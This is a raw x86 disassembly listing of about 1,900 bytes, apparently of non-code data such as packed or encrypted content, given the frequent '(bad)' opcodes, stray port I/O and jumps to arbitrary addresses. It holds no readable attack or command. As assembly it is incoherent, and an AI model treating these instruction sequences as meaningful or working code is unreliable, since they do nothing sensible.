  43ac09:	xor    bl,BYTE PTR [edx-0x29af125a]
  43ac0f:	jno    0x43ac37
  43ac11:	sbb    DWORD PTR [ebp+0x6b],0x39a14759
  43ac18:	dec    edi
  43ac19:	std    
  43ac1a:	push   edx
  43ac1b:	hlt    
  43ac1c:	test   DWORD PTR [esi],edx
  43ac1e:	adc    esp,DWORD PTR [esi-0x3a]
  43ac21:	pop    es
  43ac22:	pushf  
  43ac23:	push   ds
  43ac24:	sub    DWORD PTR [edi-0x24],ebp
  43ac27:	mov    esp,0x9b0a4196
  43ac2c:	(bad)  
  43ac2d:	cmp    cl,BYTE PTR [edi-0x71f0f560]
  43ac33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ac34:	mov    eax,0x880165e7
  43ac39:	sub    eax,0x4d0c3738
  43ac3e:	mov    ebx,0x16d5f48f
  43ac43:	mov    eax,0x88f8fa7b
  43ac48:	inc    ebx
  43ac49:	aad    0x84
  43ac4b:	fwait
  43ac4c:	test   bh,bl
  43ac4e:	ja     0x43ac04
  43ac50:	out    0x16,eax
  43ac52:	mov    esi,0xb9855c14
  43ac57:	pop    ebp
  43ac58:	retf   0x2b3e
  43ac5b:	jo     0x43ac09
  43ac5d:	cmc    
  43ac5e:	push   eax
  43ac5f:	adc    al,0x55
  43ac61:	cmc    
  43ac62:	std    
  43ac63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ac64:	(bad)  
  43ac66:	xrelease mov DWORD PTR [ebp+0xc],edx
  43ac6a:	ds mov esi,0x1ffb2bb5
  43ac70:	ret    0x4ff3
  43ac73:	sub    al,0xe8
  43ac75:	cwde   
  43ac76:	inc    esi
  43ac77:	jmp    0x95581d83
  43ac7c:	sub    BYTE PTR [esp+edi*8-0x8e046a0],dl
  43ac83:	pop    eax
  43ac84:	adc    eax,0xf7ba3347
  43ac89:	xchg   edi,eax
  43ac8a:	adc    al,0x77
  43ac8c:	test   al,0xb1
  43ac8e:	pop    ebp
  43ac8f:	loope  0x43acb5
  43ac91:	retf   0x627b
  43ac94:	test   DWORD PTR [edx],esp
  43ac96:	cdq    
  43ac97:	jmp    DWORD PTR [esi+0x20582569]
  43ac9d:	sbb    al,BYTE PTR [ecx-0x2b]
  43aca0:	adc    BYTE PTR [edi],bh
  43aca2:	mov    al,ds:0x39a44763
  43aca7:	fnstsw WORD PTR ds:0xb40cadf5
  43acad:	loope  0x43accb
  43acaf:	jne    0x43ac88
  43acb1:	and    eax,0x15e71afb
  43acb6:	(bad)  [ecx-0x12]
  43acb9:	push   0x53f0bd51
  43acbe:	xor    edx,ebx
  43acc0:	cmp    WORD PTR [edx+0x36],si
  43acc4:	jno    0x43ac52
  43acc6:	inc    edx
  43acc7:	inc    ebp
  43acc8:	ins    DWORD PTR es:[edi],dx
  43acc9:	lods   eax,DWORD PTR ds:[esi]
  43acca:	daa    
  43accb:	inc    esi
  43accc:	leave  
  43accd:	scas   al,BYTE PTR es:[edi]
  43acce:	pop    ss
  43accf:	dec    eax
  43acd0:	add    esp,edi
  43acd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43acd3:	push   cs
  43acd4:	out    dx,eax
  43acd5:	cdq    
  43acd6:	xchg   ecx,eax
  43acd7:	in     al,0x87
  43acd9:	lods   al,BYTE PTR ds:[esi]
  43acda:	fcmovbe st,st(5)
  43acdc:	out    0xc3,eax
  43acde:	repnz adc ch,ah
  43ace1:	ja     0x43ac9c
  43ace3:	add    al,0x35
  43ace5:	mov    es,WORD PTR [ecx+0xf6d0255]
  43aceb:	sbb    eax,0xa47b2c25
  43acf0:	fdiv   QWORD PTR [edx+0x63]
  43acf3:	mov    edi,esi
  43acf5:	iret   
  43acf6:	lods   eax,DWORD PTR ds:[esi]
  43acf7:	push   ecx
  43acf8:	jmp    0x8c4c8bea
  43acfd:	and    dh,cl
  43acff:	mov    ds:0xae0e438,al
  43ad04:	(bad)  
  43ad06:	test   BYTE PTR [esi],ah
  43ad08:	cmc    
  43ad09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad0a:	lds    ecx,FWORD PTR ds:0xb11defd8
  43ad10:	sbb    al,0xee
  43ad12:	shl    BYTE PTR [ebx+0x54],1
  43ad15:	jecxz  0x43acd1
  43ad17:	cmp    esp,DWORD PTR [esi+edx*4+0x2f]
  43ad1b:	inc    esi
  43ad1c:	pusha  
  43ad1d:	mov    esp,0x128181df
  43ad22:	mov    ds:0xf7b96d88,al
  43ad27:	mov    ebp,0x14519776
  43ad2c:	sub    eax,0xde643557
  43ad31:	ins    BYTE PTR es:[edi],dx
  43ad32:	mov    edi,0x8e8ec006
  43ad37:	call   0xa0c99998
  43ad3c:	or     ecx,edi
  43ad3e:	cli    
  43ad3f:	dec    esp
  43ad40:	repnz dec ecx
  43ad42:	outs   dx,DWORD PTR ds:[esi]
  43ad43:	in     eax,dx
  43ad44:	cdq    
  43ad45:	jecxz  0x43ad03
  43ad47:	aaa    
  43ad48:	jp     0x43adbd
  43ad4a:	and    eax,0x2874375c
  43ad4f:	pop    ss
  43ad50:	pop    ebp
  43ad51:	lahf   
  43ad52:	and    BYTE PTR [ebx-0x6f],al
  43ad55:	mov    bl,0x7d
  43ad57:	cmp    al,0xcb
  43ad59:	adc    BYTE PTR [esi-0x57a4865a],bl
  43ad5f:	sbb    al,0xcd
  43ad61:	(bad)  
  43ad62:	jo     0x43adbb
  43ad64:	imul   ecx,ebx,0xcd876b52
  43ad6a:	jno    0x43ad1f
  43ad6c:	jle    0x43add0
  43ad6e:	fild   QWORD PTR [ebx-0x5ef22317]
  43ad74:	sub    eax,0xa9786572
  43ad79:	repz jmp 0x6b8bd9db
  43ad7f:	in     al,0xfa
  43ad81:	inc    eax
  43ad82:	rcl    BYTE PTR [eax-0x4f],0x38
  43ad86:	add    ebx,DWORD PTR [esi+0x70b5c5e3]
  43ad8c:	loop   0x43ad51
  43ad8e:	popf   
  43ad8f:	test   eax,0x460a7bd5
  43ad94:	cwde   
  43ad95:	clc    
  43ad96:	test   al,0x13
  43ad98:	gs popa 
  43ad9a:	inc    ebx
  43ad9b:	aam    0xe2
  43ad9d:	call   0x7648:0xad6ab4d3
  43ada4:	xchg   ecx,eax
  43ada5:	push   ss
  43ada6:	jo     0x43ad86
  43ada8:	or     BYTE PTR [eax],0xc6
  43adab:	cs sbb ah,ah
  43adae:	mov    dl,0x91
  43adb0:	pushf  
  43adb1:	jge    0x43adb6
  43adb3:	(bad)  
  43adb4:	jmp    0x3c08:0xa4bf
  43adba:	push   ecx
  43adbb:	popf   
  43adbc:	mov    ah,0x4
  43adbe:	jno    0x43adac
  43adc0:	sbb    ah,BYTE PTR [eax+0x726f1465]
  43adc6:	push   eax
  43adc7:	gs push ebx
  43adc9:	mov    al,ds:0xfe965cd2
  43adce:	adc    DWORD PTR [eax+0x232759e5],ebx
  43add4:	jg     0x43ae33
  43add6:	lahf   
  43add7:	das    
  43add8:	sub    BYTE PTR [edx],ah
  43adda:	pusha  
  43addb:	outs   dx,BYTE PTR ds:[esi]
  43addc:	add    bl,BYTE PTR [ebp-0x1f]
  43addf:	jbe    0x43adaa
  43ade1:	cwde   
  43ade2:	enter  0xf131,0xd5
  43ade6:	lahf   
  43ade7:	sahf   
  43ade8:	(bad)  
  43ade9:	sub    al,BYTE PTR [ebx+0x74]
  43adec:	pop    ebp
  43aded:	push   ebx
  43adee:	inc    edi
  43adef:	adc    al,0x2e
  43adf1:	mov    al,ss:0xdb632ad5
  43adf7:	xchg   ebx,eax
  43adf8:	sub    dh,BYTE PTR [esi+0x63]
  43adfb:	and    DWORD PTR [eax],edi
  43adfd:	push   ecx
  43adfe:	inc    ecx
  43adff:	dec    ebx
  43ae00:	sub    al,0x7b
  43ae02:	sbb    ebx,DWORD PTR [esi-0x5c]
  43ae05:	es mov dh,0x57
  43ae08:	mov    dh,0x63
  43ae0a:	ret    0xe139
  43ae0d:	mov    esp,0xc2dac50a
  43ae12:	aam    0xde
  43ae14:	mov    cl,0x1b
  43ae16:	and    edx,edx
  43ae18:	add    dl,BYTE PTR [eax-0x63]
  43ae1b:	sbb    al,0x5d
  43ae1d:	out    dx,eax
  43ae1e:	pop    edx
  43ae1f:	leave  
  43ae20:	push   edi
  43ae21:	out    dx,al
  43ae22:	pop    ss
  43ae23:	mov    esp,0x2a4f398c
  43ae28:	enter  0x4efc,0x5e
  43ae2c:	or     BYTE PTR [eax-0x2b35bb69],ah
  43ae32:	jge    0x43ae99
  43ae34:	cmp    DWORD PTR [eax+0x49b0549a],edx
  43ae3a:	mov    ds:0xa70a01d9,al
  43ae3f:	and    eax,0xb18e0a43
  43ae44:	test   BYTE PTR [edi-0x2],bl
  43ae47:	das    
  43ae48:	add    BYTE PTR [esp+ebp*1+0x6],ah
  43ae4c:	push   ecx
  43ae4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ae4e:	call   0xac9ce9a6
  43ae53:	dec    edx
  43ae54:	aad    0x24
  43ae56:	cld    
  43ae57:	test   al,0x0
  43ae59:	stc    
  43ae5a:	add    al,0x99
  43ae5c:	outs   dx,DWORD PTR ds:[esi]
  43ae5d:	fstp   QWORD PTR [ecx]
  43ae5f:	inc    eax
  43ae60:	inc    ebp
  43ae61:	(bad)  
  43ae62:	jb     0x43ae39
  43ae64:	sbb    al,0x63
  43ae66:	jl     0x43ae69
  43ae68:	dec    edi
  43ae69:	mov    al,0x4
  43ae6b:	fild   DWORD PTR [eax]
  43ae6d:	data16 mov cl,0x5
  43ae70:	out    dx,eax
  43ae71:	je     0x43adf7
  43ae73:	outs   dx,BYTE PTR ds:[esi]
  43ae74:	std    
  43ae75:	fmul   DWORD PTR [esi-0x30]
  43ae78:	test   DWORD PTR [esi],eax
  43ae7a:	test   BYTE PTR [esi-0x4fc6f1c0],ch
  43ae80:	cli    
  43ae81:	ret    0x15a8
  43ae84:	dec    esp
  43ae85:	ss pop ds
  43ae87:	sar    DWORD PTR [edx+0x7a],cl
  43ae8a:	sar    DWORD PTR [ebx-0x11],1
  43ae8d:	jge    0x43aeb2
  43ae8f:	jge    0x43ae7a
  43ae91:	push   0x27ebf1ac
  43ae96:	xor    eax,0x8786970c
  43ae9b:	mov    dh,0xc0
  43ae9d:	adc    eax,0x545add32
  43aea3:	adc    ecx,eax
  43aea5:	loope  0x43ae71
  43aea7:	pop    esi
  43aea8:	mov    edx,0xd27523be
  43aead:	dec    edx
  43aeae:	popf   
  43aeaf:	(bad)  
  43aeb0:	mov    ds:0xaca998cf,al
  43aeb5:	scas   eax,DWORD PTR es:[edi]
  43aeb6:	sahf   
  43aeb7:	mov    esp,0x7c0072e3
  43aebc:	adc    al,BYTE PTR [esi+eax*2]
  43aebf:	jne    0x43ae8e
  43aec1:	jle    0x43aee5
  43aec3:	in     al,0x9f
  43aec5:	add    edi,ebp
  43aec7:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  43aec9:	or     cl,BYTE PTR [edx+0x40]
  43aecc:	mov    edx,0x4b37b0f3
  43aed1:	pop    edi
  43aed2:	fisub  WORD PTR [ecx+eiz*8]
  43aed5:	xor    ebp,DWORD PTR [ebx+0x79]
  43aed8:	sub    dl,BYTE PTR [esi+0x7b873977]
  43aede:	jbe    0x43aec3
  43aee0:	jp     0x43af2e
  43aee2:	mov    al,0x3a
  43aee4:	aaa    
  43aee5:	fsubr  DWORD PTR [ebx+ebx*4]
  43aee8:	add    al,al
  43aeea:	push   esp
  43aeeb:	adc    cl,ch
  43aeed:	lods   al,BYTE PTR ds:[esi]
  43aeee:	push   0xffffffb5
  43aef0:	ss xchg ebx,eax
  43aef2:	test   ah,dl
  43aef4:	xchg   edx,eax
  43aef5:	dec    eax
  43aef6:	pop    ebp
  43aef7:	inc    ebp
  43aef8:	loope  0x43af36
  43aefa:	div    BYTE PTR [ecx+0x1aecb9b8]
  43af00:	push   edx
  43af01:	mov    ebx,0xa9fbf84f
  43af06:	adc    al,0x27
  43af08:	push   esp
  43af09:	and    al,0xc9
  43af0b:	and    al,0x9b
  43af0d:	sti    
  43af0e:	(bad)  
  43af0f:	jge    0x43aeff
  43af11:	pusha  
  43af12:	ret    0x8362
  43af15:	ins    BYTE PTR es:[edi],dx
  43af16:	inc    ecx
  43af17:	dec    esp
  43af18:	adc    DWORD PTR [edx+0x4a],esi
  43af1b:	(bad)  
  43af1c:	mov    fs,WORD PTR [ebx]
  43af1e:	dec    eax
  43af1f:	test   DWORD PTR [ebx+0x64],esi
  43af22:	ins    BYTE PTR es:[edi],dx
  43af23:	ficomp WORD PTR [esi-0x18]
  43af26:	xchg   BYTE PTR [esi-0x38bca44c],ch
  43af2c:	adc    al,0x37
  43af2e:	pop    ebp
  43af2f:	and    DWORD PTR [esi-0xa],edx
  43af32:	inc    edi
  43af33:	es sub al,0xa
  43af36:	jae    0x43aee3
  43af38:	dec    edi
  43af39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43af3a:	and    ch,BYTE PTR [ebx-0x5b52520e]
  43af40:	aad    0x64
  43af42:	das    
  43af43:	mov    bl,0xaa
  43af45:	pop    es
  43af46:	inc    ebx
  43af47:	ret    
  43af48:	sub    WORD PTR [ebx],0xf5a2
  43af4d:	mov    al,BYTE PTR [edx-0x1f1d57d8]
  43af53:	xchg   edi,eax
  43af54:	sbb    DWORD PTR [esi-0x7e2e78b4],esp
  43af5a:	add    eax,0xafd31373
  43af5f:	mov    eax,0x6fefdfb3
  43af64:	mov    al,ds:0xe952d7e5
  43af69:	mov    ebx,0x4425470e
  43af6e:	fidiv  DWORD PTR [eax+edx*4-0x4f]
  43af72:	(bad)  
  43af74:	mov    ecx,0xaf94d8f7
  43af79:	sti    
  43af7a:	test   DWORD PTR [eax],edi
  43af7c:	dec    esi
  43af7d:	std    
  43af7e:	test   DWORD PTR [eax],0x14155099
  43af84:	cmp    dl,BYTE PTR [eax-0xe]
  43af87:	xchg   BYTE PTR [ebp-0x60],ch
  43af8a:	jle    0x43af4a
  43af8c:	and    al,0x6e
  43af8e:	push   0x4e
  43af90:	in     eax,0x6a
  43af92:	push   ebx
  43af93:	push   eax
  43af94:	int    0x73
  43af96:	jmp    0x7ce93cde
  43af9b:	data16 jb 0x43b013
  43af9e:	jns    0x43afe4
  43afa0:	push   es
  43afa1:	into   
  43afa2:	jl     0x43af26
  43afa4:	imul   eax,DWORD PTR [ebx-0x42],0x211c02d6
  43afab:	loope  0x43afde
  43afad:	jle    0x43afc8
  43afaf:	pop    ds
  43afb0:	and    eax,0x702ab293
  43afb5:	and    BYTE PTR [edx-0x5612dd5c],ah
  43afbb:	mov    ebp,0xf49f1348
  43afc0:	xchg   BYTE PTR [edi+0x3b04a7a2],bh
  43afc6:	mov    ebx,0x6a580d92
  43afcb:	outs   dx,DWORD PTR ds:[esi]
  43afcc:	jae    0x43af8a
  43afce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43afcf:	(bad)  
  43afd1:	fstp   DWORD PTR [edx-0xb23b39d]
  43afd7:	cmp    esp,edi
  43afd9:	aas    
  43afda:	mov    ds:0xc2bcac3c,eax
  43afdf:	push   esi
  43afe0:	mov    al,ds:0xa6052d9d
  43afe5:	and    cl,BYTE PTR [ecx]
  43afe7:	imul   esi,DWORD PTR gs:[ebx+0x3b27159c],0xdc2e1fb6
  43aff2:	lea    ebp,es:0x4bb0093a
  43aff9:	in     eax,dx
  43affa:	sbb    DWORD PTR ss:[edx-0x34],eax
  43affe:	mov    bl,0xbe
  43b000:	test   ah,cl
  43b002:	xor    ax,0x6090
  43b006:	inc    esi
  43b007:	mov    ds:0x4bdd827c,eax
  43b00c:	push   es
  43b00d:	add    DWORD PTR [edi],esi
  43b00f:	and    al,0x6a
  43b011:	or     esi,DWORD PTR [ebx+ecx*2+0x54]
  43b015:	adc    DWORD PTR [edx+0x627c3189],esi
  43b01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b01c:	jmp    0x43afb4
  43b01e:	popf   
  43b01f:	int3   
  43b020:	les    edi,FWORD PTR [ebx+ebx*8+0x5321c4be]
  43b027:	xor    ebx,DWORD PTR ds:[esi+eax*8-0x72ef5492]
  43b02f:	and    bh,0x6c
  43b032:	sbb    ah,BYTE PTR [edi-0x43]
  43b035:	out    0x8b,eax
  43b037:	inc    edx
  43b038:	cmp    eax,0x13597394
  43b03d:	mov    edx,0xac3db7c3
  43b042:	aam    0x41
  43b044:	mov    bl,0x2c
  43b046:	imul   edx,DWORD PTR [esi+0x8875266],0xc
  43b04d:	adc    bh,bh
  43b04f:	dec    ebp
  43b050:	mov    dl,0xda
  43b052:	retf   0x8203
  43b055:	jne    0x43b0bc
  43b057:	mov    BYTE PTR [ecx],bl
  43b059:	cmp    eax,DWORD PTR [edi]
  43b05b:	push   cs
  43b05c:	add    BYTE PTR [eax],dl
  43b05e:	outs   dx,BYTE PTR ds:[esi]
  43b05f:	sbb    edi,ebx
  43b061:	es inc ebp
  43b063:	mov    al,ds:0x88d02dce
  43b068:	cld    
  43b069:	xchg   edi,eax
  43b06a:	mov    al,0xca
  43b06c:	test   BYTE PTR [ebx-0x5c],bl
  43b06f:	sub    DWORD PTR [esi-0xb],esp
  43b072:	aad    0x2b
  43b074:	lds    ecx,FWORD PTR [edi+edi*2-0x6c]
  43b078:	mov    bl,ch
  43b07a:	mov    bl,0x1f
  43b07c:	mov    cl,BYTE PTR [ebx]
  43b07e:	xor    esi,DWORD PTR [esi]
  43b080:	pop    ecx
  43b081:	sub    BYTE PTR [ebx],ah
  43b083:	pop    eax
  43b084:	mov    ds:0xd5ec22f4,eax
  43b089:	or     BYTE PTR [ebx+ebp*2+0x77],bh
  43b08d:	dec    ebx
  43b08e:	ror    DWORD PTR [edx-0x5e1e4326],0x83
  43b095:	push   ebp
  43b096:	mov    ah,0x4d
  43b098:	push   0x62
  43b09a:	sbb    DWORD PTR [ebp-0x3d2cf0ee],ecx
  43b0a0:	imul   ebp,DWORD PTR [ebp-0x27661aa2],0xd1f08076
  43b0aa:	repnz or eax,0x5d951277
  43b0b0:	mov    bh,0xd9
  43b0b2:	out    dx,eax
  43b0b3:	(bad)
  43b0b6:	mov    eax,ebx
  43b0b8:	sub    al,0x81
  43b0ba:	repz repz fs push cs
  43b0be:	imul   edx,DWORD PTR [eax+0x67],0xffffffe1
  43b0c2:	mov    esi,?
  43b0c4:	imul   eax,DWORD PTR [esi-0x31],0x18
  43b0c8:	retf   0x532d
  43b0cb:	mov    esp,0xf41586cf
  43b0d0:	add    DWORD PTR ds:0x5ce31d9c,ebx
  43b0d6:	sbb    al,0x8d
  43b0d8:	mov    bl,0xe5
  43b0da:	pop    es
  43b0db:	in     eax,0xb6
  43b0dd:	or     eax,ebp
  43b0df:	xor    DWORD PTR [eax],edi
  43b0e1:	xchg   edi,eax
  43b0e2:	add    BYTE PTR [ebx],dh
  43b0e4:	sbb    bh,BYTE PTR [edi-0x2b906ebc]
  43b0ea:	xor    eax,0xdc573b75
  43b0ef:	dec    edi
  43b0f0:	mov    ss,ebx
  43b0f2:	inc    esp
  43b0f3:	int3   
  43b0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b0f5:	call   0xbb7534fe
  43b0fa:	sub    eax,0x1d2d993
  43b0ff:	and    DWORD PTR [ebp+0x790739f0],0xf31a4ec0
  43b109:	outs   dx,DWORD PTR ds:[esi]
  43b10a:	or     esi,DWORD PTR [eax]
  43b10c:	add    edi,edx
  43b10e:	add    al,0x56
  43b110:	xlat   BYTE PTR ds:[ebx]
  43b111:	and    DWORD PTR ds:0xea643434,edi
  43b117:	lea    ebp,[edx-0x61aae194]
  43b11d:	(bad)  
  43b11e:	aas    
  43b11f:	or     dh,al
  43b121:	les    ebp,FWORD PTR [edi-0x44ba0ddc]
  43b127:	and    eax,0x17d12583
  43b12c:	out    dx,eax
  43b12d:	arpl   WORD PTR [edi+edi*1],bx
  43b130:	push   ebx
  43b131:	dec    edi
  43b132:	loop   0x43b162
  43b134:	xchg   esi,eax
  43b135:	stos   DWORD PTR es:[edi],eax
  43b136:	stc    
  43b137:	(bad)  
  43b138:	es dec edx
  43b13a:	std    
  43b13b:	push   esp
  43b13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b13d:	out    0x9c,al
  43b13f:	adc    al,0x15
  43b141:	stos   DWORD PTR es:[edi],eax
  43b142:	jo     0x43b149
  43b144:	iret   
  43b145:	push   ebx
  43b146:	cmp    eax,0x9cbae378
  43b14b:	cmp    al,0x1b
  43b14d:	imul   edx,DWORD PTR [edi],0x44
  43b150:	sub    ebx,DWORD PTR [edx+0x1fecf264]
  43b156:	ret    0x27df
  43b159:	jo     0x43b14a
  43b15b:	jecxz  0x43b13d
  43b15d:	sbb    cl,BYTE PTR [eax-0x46]
  43b160:	jl     0x43b1a0
  43b162:	sub    esi,DWORD PTR [ebx+0x3b]
  43b165:	jae    0x43b11d
  43b167:	lea    ebx,[edi-0x16]
  43b16a:	xchg   edx,eax
  43b16b:	adc    edx,DWORD PTR [ebx]
  43b16d:	mov    ss,WORD PTR [ebx+0x32]
  43b170:	repnz mov ah,0xb9
  43b173:	xchg   esp,eax
  43b174:	and    ebx,DWORD PTR [ecx]
  43b176:	add    eax,0x8b3d2c75
  43b17b:	sbb    dh,bh
  43b17d:	shl    BYTE PTR [ebx+edx*2-0x19],0xb5
  43b182:	aas    
  43b183:	mov    ch,0x8f
  43b185:	sub    ah,BYTE PTR [edx]
  43b187:	xor    al,0xbf
  43b189:	jnp    0x43b1ae
  43b18b:	push   esi
  43b18c:	retf   
  43b18d:	cdq    
  43b18e:	mov    ch,0xa9
  43b190:	pop    eax
  43b191:	xchg   BYTE PTR [ecx],bh
  43b193:	xchg   ecx,eax
  43b194:	test   BYTE PTR [esi-0x22],cl
  43b197:	push   esi
  43b198:	add    edi,DWORD PTR [edx+0x51]
  43b19b:	(bad)  
  43b19c:	repz ss ret 0xb8c2
  43b1a1:	and    ch,BYTE PTR [edx+0x74b714be]
  43b1a7:	aad    0x2c
  43b1a9:	out    0x32,al
  43b1ab:	mov    BYTE PTR [eax+0x4],dl
  43b1ae:	fmul   QWORD PTR [edx-0x71]
  43b1b1:	aas    
  43b1b2:	stos   DWORD PTR es:[edi],eax
  43b1b3:	inc    edx
  43b1b4:	aaa    
  43b1b5:	sar    DWORD PTR [ecx],cl
  43b1b7:	pushf  
  43b1b8:	jae    0x43b1d1
  43b1ba:	fiadd  DWORD PTR [edx+0x1fd56467]
  43b1c0:	fdivrp st(6),st
  43b1c2:	xchg   ebx,eax
  43b1c3:	sbb    eax,0x46d3feaf
  43b1c8:	mov    ds:0x3c4cfb3a,al
  43b1cd:	inc    ebp
  43b1ce:	push   edx
  43b1cf:	add    ebx,esp
  43b1d1:	push   edx
  43b1d2:	mov    ebx,0xdd120b71
  43b1d7:	(bad)  
  43b1d8:	xlat   BYTE PTR ds:[ebx]
  43b1d9:	or     DWORD PTR [ebp-0x36ff6020],eax
  43b1df:	or     bl,BYTE PTR [edi+ebp*8]
  43b1e2:	mov    ds:0xa7646793,eax
  43b1e7:	arpl   WORD PTR [ebx+0x69],ax
  43b1ea:	popf   
  43b1eb:	loopne 0x43b193
  43b1ed:	sbb    edx,DWORD PTR [ecx]
  43b1ef:	add    eax,DWORD PTR [edx+0xf]
  43b1f2:	nop
  43b1f3:	dec    ecx
  43b1f4:	mov    dl,0x34
  43b1f6:	dec    BYTE PTR [edi+edx*8-0xa]
  43b1fa:	pop    ebp
  43b1fb:	dec    esp
  43b1fc:	jl     0x43b247
  43b1fe:	loop   0x43b242
  43b200:	fiadd  DWORD PTR [edi+0xd]
  43b203:	adc    ebx,DWORD PTR [esi-0xf]
  43b206:	or     ebp,DWORD PTR [esi-0x3914475b]
  43b20c:	cmp    eax,0x15df3993
  43b211:	mov    WORD PTR [esi-0x45aac38b],cs
  43b217:	outs   dx,DWORD PTR ds:[esi]
  43b218:	ror    BYTE PTR [edi],1
  43b21a:	adc    BYTE PTR [edx+0x1],bh
  43b21d:	cmp    eax,DWORD PTR [ecx+esi*8+0x3b]
  43b221:	cmp    eax,0xfbe7ad79
  43b226:	int    0x29
  43b228:	scas   al,BYTE PTR es:[edi]
  43b229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b22a:	mov    ds:0x8361094e,eax
  43b22f:	xor    cl,ah
  43b231:	popa   
  43b232:	inc    eax
  43b233:	push   ebx
  43b234:	dec    ebp
  43b235:	test   BYTE PTR [ecx-0x1f],al
  43b238:	imul   edi,DWORD PTR [eax+0x4d],0xeb5411cd
  43b23f:	je     0x43b26d
  43b241:	cld    
  43b242:	out    0xe6,eax
  43b244:	sahf   
  43b245:	outs   dx,BYTE PTR ds:[esi]
  43b246:	add    al,0xe
  43b248:	retf   0xcfc8
  43b24b:	cmc    
  43b24c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b24d:	mov    dh,0x80
  43b24f:	(bad)  
  43b250:	push   ebp
  43b251:	sbb    BYTE PTR [esi+0x1ce937f4],dh
  43b257:	es mov ecx,0x67842b42
  43b25d:	adc    DWORD PTR [si-0x50ce],eax
  43b262:	inc    edx
  43b263:	and    DWORD PTR [ebp-0x45],esi
  43b266:	fild   DWORD PTR [ebx+0x3c]
  43b269:	data16 jmp 0x43b1ec
  43b26c:	inc    edi
  43b26d:	stos   BYTE PTR es:[edi],al
  43b26e:	dec    edi
  43b26f:	scas   eax,DWORD PTR es:[edi]
  43b270:	loope  0x43b2b5
  43b272:	(bad)  
  43b273:	mov    ch,0xc5
  43b275:	sbb    BYTE PTR [ebx-0x16],cl
  43b278:	mov    bl,0x3a
  43b27a:	inc    ecx
  43b27b:	xor    eax,0x4034fe7a
  43b280:	into   
  43b281:	and    dh,cl
  43b283:	or     eax,DWORD PTR [ebp-0x70]
  43b286:	mov    esi,DWORD PTR [ebp-0x5f]
  43b289:	sbb    al,0xf7
  43b28b:	push   0x204819a7
  43b290:	stos   DWORD PTR es:[edi],eax
  43b291:	jg     0x43b241
  43b293:	push   ds
  43b294:	mov    ds,WORD PTR [eax]
  43b296:	js     0x43b276
  43b298:	and    ecx,DWORD PTR [ebx+eax*2+0x35]
  43b29c:	gs mov edi,0x719f8bec
  43b2a2:	std    
  43b2a3:	(bad)  
  43b2a4:	ror    BYTE PTR ds:[ebp+0x1f],0x22
  43b2a9:	pop    edx
  43b2aa:	dec    edi
  43b2ab:	mov    bh,0x54
  43b2ad:	shl    DWORD PTR [ebx-0x63fbdd33],0xda
  43b2b4:	js     0x43b286
  43b2b6:	xor    BYTE PTR [ebx-0x1b],ch
  43b2b9:	loopne 0x43b25a
  43b2bb:	xchg   esi,eax
  43b2bc:	(bad)  
  43b2bd:	jmp    0xc840:0x4c3865d6
  43b2c4:	xchg   edx,eax
  43b2c5:	push   cs
  43b2c6:	mov    ebp,0x78069acb
  43b2cb:	ficom  WORD PTR [edi-0x5546e5a]
  43b2d1:	push   esi
  43b2d2:	inc    ebx
  43b2d3:	mov    ebp,0x6e2bced0
  43b2d8:	mov    esi,0x2576ddb4
  43b2dd:	addr16 xchg ah,ch
  43b2e0:	ja     0x43b342
  43b2e2:	loop   0x43b2f9
  43b2e4:	sub    edx,DWORD PTR [edx+0x4b]
  43b2e7:	mov    ecx,0x7f088c1a
  43b2ec:	outs   dx,DWORD PTR ds:[esi]
  43b2ed:	add    bh,ch
  43b2ef:	out    0x1b,al
  43b2f1:	inc    ebx
  43b2f2:	lahf   
  43b2f3:	rcr    DWORD PTR [edx],0xf9
  43b2f6:	pop    ecx
  43b2f7:	aaa    
  43b2f8:	xchg   DWORD PTR [ebx],ebp
  43b2fa:	outs   dx,BYTE PTR ds:[esi]
  43b2fb:	div    BYTE PTR [eax]
  43b2fd:	in     al,0x82
  43b2ff:	ins    BYTE PTR es:[edi],dx
  43b300:	push   esi
  43b301:	jmp    DWORD PTR [esi]
  43b303:	(bad)  
  43b304:	cli    
  43b305:	int3   
  43b306:	iret   
  43b307:	sub    dl,BYTE PTR [edx-0x6b330e19]
  43b30d:	mov    DWORD PTR [edi+0x6ca8ae3d],0x26ef0c95
  43b317:	dec    edi
  43b318:	adc    BYTE PTR [ebx],dh
  43b31a:	cwde   
  43b31b:	or     BYTE PTR [eax],bl
  43b31d:	dec    edi
  43b31e:	cmp    BYTE PTR [ecx+ecx*4-0x1c],0x17
  43b323:	xchg   ebp,eax
  43b324:	add    bl,BYTE PTR ds:0x57c3152e
  43b32a:	shr    DWORD PTR [ecx-0xd],cl
  43b32d:	daa    
  43b32e:	mul    al
  43b330:	pop    eax
  43b331:	adc    eax,DWORD PTR [edi-0x8f03906]
  43b337:	pop    es
  43b338:	or     eax,0x4aa8ac8f
  43b33d:	or     al,0x72
  43b33f:	stos   BYTE PTR es:[di],al
  43b341:	sub    DWORD PTR [edi+0x40],0x7c
  43b345:	(bad)  
  43b346:	or     BYTE PTR [ebx-0x9b5d6d1],ah
  43b34c:	xor    esp,DWORD PTR [ebp-0x3b377af9]
  43b352:	lea    ebp,[esi-0x5f99a687]
  43b358:	inc    edx
  43b359:	push   esi
  43b35a:	(bad)  
  43b35b:	jnp    0x43b378
  43b35d:	(bad)  
  43b35e:	nop
  43b35f:	aad    0xb0
  43b361:	pop    edi
  43b362:	pop    edi
  43b363:	imul   esp,DWORD PTR [edx+0x69],0x51
  43b367:	out    0x2a,al
  43b369:	popf   
  43b36a:	loopne 0x43b383
  43b36c:	add    al,0x83
  43b36e:	inc    esi
  43b36f:	mov    ah,0x8e
  43b371:	xchg   edi,eax
  43b372:	rcr    BYTE PTR ds:0x71f3f7e2,cl
  43b378:	and    esi,ebp
  43b37a:	xchg   DWORD PTR [esi-0x42],esi
